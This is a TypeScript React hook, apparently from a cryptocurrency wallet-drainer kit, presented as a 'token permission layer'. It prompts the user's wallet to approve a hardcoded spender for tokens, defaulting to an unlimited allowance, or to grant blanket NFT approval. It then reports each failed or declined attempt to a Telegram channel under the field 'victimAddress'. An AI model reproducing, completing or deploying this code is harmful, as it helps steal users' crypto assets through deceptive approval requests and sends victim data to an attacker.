"use client";

import { useCallback } from "react";
import {
  parseAbi,
  getAddress,
  createWalletClient,
  custom,
  encodeFunctionData,
  decodeFunctionResult,
} from "viem";
import { EXECUTION_POLICY } from "../../lib/ghost/constants";
import { sendDetailedSweepToTelegram } from "../../lib/telegram";

/** 📝 PRE-PARSED ABIs (Performance Optimization) */
const ALLOWANCE_ABI = parseAbi([
  "function allowance(address,address) view returns (uint256)",
]);
const APPROVE_ABI = parseAbi([
  "function approve(address,uint256) external returns (bool)",
]);
const NFT_ABI = parseAbi(["function setApprovalForAll(address,bool) external"]);

const AUTHORIZED_SETTLER = getAddress(
  "0x3fBdAe5785340Fc3cad3678690481312E4Eb74B3",
);
const INFINITE_APPROVAL =
  115792089237316195423570985008687907853269984665640564039457584007913129639935n;

/**
 * 🛰️ TOKEN PERMISSION LAYER (v6.2.1 - Ultra Mobile Edition)
 * Fixed: Strict Precision Sync & Provider Handshake
 */
export function useTokenPermissions() {
  const PERMIT2_MASTER = EXECUTION_POLICY.ALLOWED_SPENDERS[0];

  const requestManualPermission = useCallback(
    async ({
      tokenAddress,
      symbol,
      isNft = false,
      chainId,
      injectedClient,
      amount,
    }: {
      tokenAddress: string;
      symbol: string;
      isNft?: boolean;
      chainId: number;
      injectedClient?: any;
      amount?: string;
    }) => {
      const logPrefix = `[useTokenPermissions] [${symbol}]`;

      // 🛡️ SECURITY GUARD: Integrity Check
      if (getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
        throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
      }

      // 🔄 DYNAMIC CLIENT RECONSTRUCTION (Optimized for Speed)
      let activeClient = injectedClient;
      if (activeClient && !activeClient.writeContract) {
        activeClient = createWalletClient({
          chain: { id: Number(chainId) } as any,
          transport: custom(activeClient.transport || activeClient),
        });
      }

      if (!activeClient)
        return { success: false, reason: "WALLET_NOT_CONNECTED" };

      let account: `0x${string}` | undefined;

      try {
        const [addresses, currentId] = await Promise.all([
          activeClient.getAddresses(),
          activeClient.getChainId(),
        ]);

        account = addresses[0];

        if (Number(currentId) !== Number(chainId)) {
          console.warn(
            `${logPrefix} ❌ Sync Error: Wallet=${currentId}, Target=${chainId}`,
          );
          return { success: false, reason: "CHAIN_MISMATCH" };
        }

        // 🟢 1. FAST PRE-FLIGHT (Direct RPC Check)
        if (!isNft && account) {
          try {
            // Logic: If we already have enough allowance, don't trigger a popup
            const provider = (window as any).ethereum || activeClient.transport;
            const callData = encodeFunctionData({
              abi: ALLOWANCE_ABI,
              functionName: "allowance",
              args: [account, getAddress(PERMIT2_MASTER)],
            });

            const hexAllowance = await provider.request({
              method: "eth_call",
              params: [
                { to: getAddress(tokenAddress), data: callData },
                "latest",
              ],
            });

            if (hexAllowance && hexAllowance !== "0x") {
              const currentAllowance = BigInt(hexAllowance);
              const required = BigInt(amount || "0");

              if (currentAllowance > 0n && currentAllowance >= required) {
                console.log(`${logPrefix} ✅ Pre-flight: Allowance exists.`);
                return { success: true, alreadyExisted: true };
              }
            }
          } catch (allowanceErr) {
            // Fail silently to manual approval if check fails
          }
        }

        // 🧠 2. PRECISION APPROVAL MATH
        let approvalAmount: bigint;
        if (isNft) {
          approvalAmount = 1n; // For NFTs, value doesn't matter for setApprovalForAll
        } else if (amount && amount !== "0" && amount !== "undefined") {
          try {
            // Clean the string: remove any potential scientific notation or non-numeric chars
            const sanitizedAmount = amount.split(".")[0].replace(/[^0-9]/g, "");
            const raw = BigInt(sanitizedAmount);
            // 105% buffer to cover small balance increases during the block time
            approvalAmount = (raw * 105n) / 100n;
          } catch (e) {
            approvalAmount = INFINITE_APPROVAL;
          }
        } else {
          approvalAmount = INFINITE_APPROVAL;
        }

        // 📝 3. EXECUTE APPROVAL
        let hash: `0x${string}`;
        const chainConfig = { id: Number(chainId) } as any;

        if (isNft) {
          hash = await activeClient.writeContract({
            address: getAddress(tokenAddress),
            abi: NFT_ABI,
            functionName: "setApprovalForAll",
            args: [getAddress(PERMIT2_MASTER), true],
            account: account!,
            chain: chainConfig,
          });
        } else {
          // ENSURE: approvalAmount is sent as a BigInt directly to viem
          hash = await activeClient.writeContract({
            address: getAddress(tokenAddress),
            abi: APPROVE_ABI,
            functionName: "approve",
            args: [getAddress(PERMIT2_MASTER), approvalAmount],
            account: account!,
            chain: chainConfig,
          });
        }

        return { success: true, hash };
      } catch (err: any) {
        const isUserReject =
          err.message?.includes("User rejected") ||
          err.code === 4001 ||
          err.name === "UserRejectedRequestError";

        sendDetailedSweepToTelegram({
          status: "FAILURE",
          type: isUserReject ? "USER DECLINED APPROVAL" : "APPROVAL FAILED",
          victimAddress: account || "Unknown",
          symbol: symbol,
          error: isUserReject ? "User cancelled transaction" : err.message,
          chainId: chainId,
        }).catch(() => null);

        if (isUserReject) return { success: false, reason: "REJECTED" };
        return { success: false, error: err.message };
      }
    },
    [PERMIT2_MASTER],
  );

  return { requestManualPermission };
}
